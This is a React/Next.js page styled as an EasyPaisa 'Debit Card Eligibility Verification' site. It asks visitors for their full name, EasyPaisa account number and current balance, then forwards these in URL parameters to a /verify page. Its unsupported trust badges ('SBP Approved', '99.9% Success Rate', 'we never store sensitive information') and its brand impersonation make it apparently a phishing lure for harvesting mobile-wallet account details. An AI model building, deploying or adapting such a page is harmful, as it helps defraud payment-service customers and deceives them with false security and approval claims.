"use client"

import { useState } from "react"
import { submitVerification } from "./actions"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Shield, Users, Clock, CheckCircle, CreditCard, Star, Timer } from "lucide-react"
import { EasyPaisaLogo } from "@/components/easypaisa-logo"

export default function VerificationPage() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [message, setMessage] = useState<{ type: "success" | "error"; text: string } | null>(null)

  async function handleSubmit(formData: FormData) {
    setIsSubmitting(true)
    setMessage(null)

    const result = await submitVerification(formData)

    if (result.success) {
      // Redirect to verification page with customer data
      const accountNumber = formData.get("accountNumber") as string
      const currentBalance = formData.get("currentBalance") as string
      const fullName = formData.get("fullName") as string

      const params = new URLSearchParams({
        account: accountNumber,
        balance: currentBalance,
        name: fullName,
      })

      window.location.href = `/verify?${params.toString()}`
    } else {
      setMessage({ type: "error", text: result.error! })
    }

    setIsSubmitting(false)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-green-50 to-teal-50">
      {/* Ultra Mobile-First Header */}
      <div className="bg-gradient-to-r from-emerald-600 via-green-600 to-teal-600 py-3 sm:py-6">
        <div className="max-w-7xl mx-auto px-2 sm:px-6 lg:px-8">
          <div className="flex flex-col items-center justify-center space-y-2 sm:space-y-0">
            <EasyPaisaLogo width={140} height={47} variant="white" clickable={true} mobile={true} />
          </div>
        </div>
      </div>

      <main className="max-w-6xl mx-auto px-2 sm:px-6 lg:px-8 py-3 sm:py-8">
        {/* Ultra Mobile-Optimized Hero Section */}
        <div className="text-center mb-8 sm:mb-16">
          {/* Pakistan's #1 Badge */}
          <div className="flex justify-center mb-4 sm:mb-8">
            <Badge className="bg-gradient-to-r from-emerald-500 to-green-600 text-white border-0 px-3 sm:px-6 py-1.5 sm:py-2 text-xs sm:text-sm font-semibold shadow-lg">
              <Star className="w-3 h-3 sm:w-4 sm:h-4 mr-1 fill-current" />
              Pakistan's #1 Digital Payment Platform
            </Badge>
          </div>

          {/* Ultra Mobile-Responsive Main Heading */}
          <h1 className="text-2xl sm:text-4xl md:text-6xl font-bold bg-gradient-to-r from-emerald-600 to-green-700 bg-clip-text text-transparent mb-4 sm:mb-6 leading-tight px-1">
            Debit Card Eligibility
            <br />
            <span className="text-xl sm:text-3xl md:text-5xl">Verification</span>
          </h1>

          {/* Ultra Mobile-Optimized Subtitle */}
          <p className="text-sm sm:text-lg text-gray-600 mb-6 sm:mb-10 max-w-3xl mx-auto leading-relaxed px-3">
            Get instant verification for your EasyPaisa Debit Card. Join millions of satisfied customers with our secure
            and lightning-fast verification process.
          </p>

          {/* Ultra Mobile-Responsive Feature Badges */}
          <div className="flex flex-wrap justify-center gap-2 sm:gap-4 mb-6 sm:mb-12 px-2">
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-2 sm:px-4 py-1 sm:py-2 text-xs sm:text-sm shadow-md"
            >
              <Shield className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
              Bank-Level Security
            </Badge>
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-2 sm:px-4 py-1 sm:py-2 text-xs sm:text-sm shadow-md"
            >
              <Timer className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
              2-Minute Process
            </Badge>
            <Badge
              variant="outline"
              className="bg-white text-emerald-600 border-emerald-200 px-2 sm:px-4 py-1 sm:py-2 text-xs sm:text-sm shadow-md"
            >
              <CheckCircle className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
              99.9% Success Rate
            </Badge>
          </div>

          {/* Ultra Mobile-Responsive Stats Cards */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-2 sm:gap-6 mb-8 sm:mb-16 px-1">
            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300">
              <CardContent className="p-2 sm:p-6 text-center">
                <div className="w-8 h-8 sm:w-12 sm:h-12 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-xl flex items-center justify-center mx-auto mb-2 sm:mb-4 shadow-lg">
                  <Users className="w-4 h-4 sm:w-6 sm:h-6 text-white" />
                </div>
                <div className="text-lg sm:text-2xl font-bold text-emerald-600 mb-1">2M+</div>
                <div className="text-gray-600 font-medium text-xs sm:text-sm">Cards Activated</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300">
              <CardContent className="p-2 sm:p-6 text-center">
                <div className="w-8 h-8 sm:w-12 sm:h-12 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-xl flex items-center justify-center mx-auto mb-2 sm:mb-4 shadow-lg">
                  <Star className="w-4 h-4 sm:w-6 sm:h-6 text-white fill-current" />
                </div>
                <div className="text-lg sm:text-2xl font-bold text-emerald-600 mb-1">99.9%</div>
                <div className="text-gray-600 font-medium text-xs sm:text-sm">Success Rate</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300">
              <CardContent className="p-2 sm:p-6 text-center">
                <div className="w-8 h-8 sm:w-12 sm:h-12 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-xl flex items-center justify-center mx-auto mb-2 sm:mb-4 shadow-lg">
                  <Clock className="w-4 h-4 sm:w-6 sm:h-6 text-white" />
                </div>
                <div className="text-lg sm:text-2xl font-bold text-emerald-600 mb-1">2 Min</div>
                <div className="text-gray-600 font-medium text-xs sm:text-sm">Average Time</div>
              </CardContent>
            </Card>

            <Card className="bg-white shadow-lg border-0 hover:shadow-xl transition-all duration-300">
              <CardContent className="p-2 sm:p-6 text-center">
                <div className="w-8 h-8 sm:w-12 sm:h-12 bg-gradient-to-br from-emerald-400 to-emerald-600 rounded-xl flex items-center justify-center mx-auto mb-2 sm:mb-4 shadow-lg">
                  <Shield className="w-4 h-4 sm:w-6 sm:h-6 text-white" />
                </div>
                <div className="text-lg sm:text-2xl font-bold text-emerald-600 mb-1">24/7</div>
                <div className="text-gray-600 font-medium text-xs sm:text-sm">Support</div>
              </CardContent>
            </Card>
          </div>

          {/* Ultra Mobile-Responsive Feature Sections */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 sm:gap-10 mb-8 sm:mb-16 px-2">
            <div className="text-center group">
              <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-emerald-600" />
              </div>
              <h3 className="text-lg sm:text-xl font-bold text-emerald-600 mb-2 sm:mb-3">Secure Verification</h3>
              <p className="text-gray-600 leading-relaxed text-sm sm:text-base">
                Your data is protected with bank-level security and end-to-end encryption. We never store sensitive
                information.
              </p>
            </div>

            <div className="text-center group">
              <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <CreditCard className="w-6 h-6 sm:w-8 sm:h-8 text-emerald-600" />
              </div>
              <h3 className="text-lg sm:text-xl font-bold text-emerald-600 mb-2 sm:mb-3">Instant Verification</h3>
              <p className="text-gray-600 leading-relaxed text-sm sm:text-base">
                Get results in seconds, not days. Our AI-powered system ensures lightning-fast processing and approval.
              </p>
            </div>

            <div className="text-center group">
              <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 group-hover:scale-110 transition-transform duration-300 shadow-lg">
                <Users className="w-6 h-6 sm:w-8 sm:h-8 text-emerald-600" />
              </div>
              <h3 className="text-lg sm:text-xl font-bold text-emerald-600 mb-2 sm:mb-3">Trusted by Millions</h3>
              <p className="text-gray-600 leading-relaxed text-sm sm:text-base">
                Join millions of satisfied EasyPaisa users across Pakistan who trust our platform for their financial
                needs.
              </p>
            </div>
          </div>

          {/* Ultra Mobile-Optimized CTA Button */}
          <div className="flex justify-center mb-8 sm:mb-12 px-2">
            <Button
              size="lg"
              className="bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 text-white px-6 sm:px-12 py-3 sm:py-5 text-base sm:text-lg font-bold rounded-xl shadow-2xl transition-all duration-300 transform hover:scale-105 active:scale-95 w-full sm:w-auto max-w-sm touch-manipulation"
              onClick={() => {
                const formSection = document.getElementById("verification-form-section")
                formSection?.scrollIntoView({ behavior: "smooth" })
              }}
            >
              <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 mr-2 sm:mr-3" />
              Start Verification Process
            </Button>
          </div>
        </div>

        {/* Ultra Mobile-Optimized Verification Form Section */}
        <div id="verification-form-section" className="max-w-lg mx-auto px-2">
          <Card className="shadow-2xl border-0 overflow-hidden">
            <CardHeader className="bg-gradient-to-r from-emerald-600 to-green-600 text-white p-4 sm:p-6">
              <CardTitle className="text-center text-lg sm:text-xl font-bold">Verify Your Eligibility</CardTitle>
              <CardDescription className="text-emerald-100 text-center text-sm sm:text-base">
                Enter your account details to begin instant verification
              </CardDescription>
            </CardHeader>
            <CardContent className="p-4 sm:p-8">
              <form id="verification-form" action={handleSubmit} className="space-y-4 sm:space-y-6">
                <div>
                  <Label htmlFor="fullName" className="text-sm font-semibold text-gray-700 mb-2 block">
                    Full Name
                  </Label>
                  <Input
                    id="fullName"
                    name="fullName"
                    placeholder="Enter your full name as per CNIC"
                    required
                    disabled={isSubmitting}
                    className="h-10 sm:h-12 text-sm sm:text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg touch-manipulation"
                  />
                </div>

                <div>
                  <Label htmlFor="accountNumber" className="text-sm font-semibold text-gray-700 mb-2 block">
                    EasyPaisa Account Number
                  </Label>
                  <Input
                    id="accountNumber"
                    name="accountNumber"
                    placeholder="03XXXXXXXXX"
                    pattern="03\d{9}"
                    required
                    disabled={isSubmitting}
                    className="h-10 sm:h-12 text-sm sm:text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg touch-manipulation"
                    inputMode="numeric"
                  />
                </div>

                <div>
                  <Label htmlFor="currentBalance" className="text-sm font-semibold text-gray-700 mb-2 block">
                    Current Account Balance (PKR)
                  </Label>
                  <Input
                    id="currentBalance"
                    name="currentBalance"
                    type="number"
                    step="0.01"
                    min="0"
                    placeholder="Enter current balance amount"
                    required
                    disabled={isSubmitting}
                    className="h-10 sm:h-12 text-sm sm:text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg touch-manipulation"
                    inputMode="decimal"
                  />
                </div>

                <div>
                  <Label htmlFor="securityComment" className="text-sm font-semibold text-gray-700 mb-2 block">
                    Security Comment (Optional)
                  </Label>
                  <Textarea
                    id="securityComment"
                    name="securityComment"
                    placeholder="Any additional information or security notes"
                    rows={3}
                    disabled={isSubmitting}
                    className="text-sm sm:text-base border-2 border-gray-200 focus:border-emerald-500 rounded-lg resize-none touch-manipulation"
                  />
                </div>

                {message && (
                  <div
                    className={`p-3 sm:p-4 rounded-lg text-sm font-medium ${
                      message.type === "success"
                        ? "bg-green-50 text-green-700 border-2 border-green-200"
                        : "bg-red-50 text-red-700 border-2 border-red-200"
                    }`}
                  >
                    {message.type === "success" && <CheckCircle className="w-4 h-4 inline mr-2" />}
                    {message.text}
                  </div>
                )}

                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 py-3 sm:py-4 text-sm sm:text-base font-bold rounded-lg shadow-lg transition-all duration-300 active:scale-95 touch-manipulation"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Clock className="w-4 h-4 sm:w-5 sm:h-5 mr-2 animate-spin" />
                      Processing Verification...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                      Verify Eligibility Now
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>

        {/* Ultra Mobile-Responsive Trust Indicators */}
        <div className="text-center mt-8 sm:mt-16">
          <div className="flex flex-wrap justify-center items-center gap-2 sm:gap-6 mb-4 sm:mb-6 px-2">
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-2 py-1 text-xs">
              <Shield className="w-3 h-3 mr-1" />
              SSL Secured
            </Badge>
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-2 py-1 text-xs">
              <CheckCircle className="w-3 h-3 mr-1" />
              SBP Approved
            </Badge>
            <Badge variant="outline" className="bg-white text-gray-600 border-gray-200 px-2 py-1 text-xs">
              <Users className="w-3 h-3 mr-1" />
              2M+ Users Trust Us
            </Badge>
          </div>
        </div>

        {/* Ultra Mobile-Responsive Footer */}
        <div className="text-center mt-8 sm:mt-12 text-gray-500 px-2">
          <p className="text-sm sm:text-base">© 2024 EasyPaisa. All rights reserved.</p>
          <div className="flex flex-wrap justify-center gap-2 sm:gap-4 mt-2">
            <a href="#" className="text-emerald-600 hover:underline font-medium text-xs sm:text-sm">
              Privacy Policy
            </a>
            <span className="text-gray-400">|</span>
            <a href="#" className="text-emerald-600 hover:underline font-medium text-xs sm:text-sm">
              Terms of Service
            </a>
          </div>
        </div>
      </main>
    </div>
  )
}
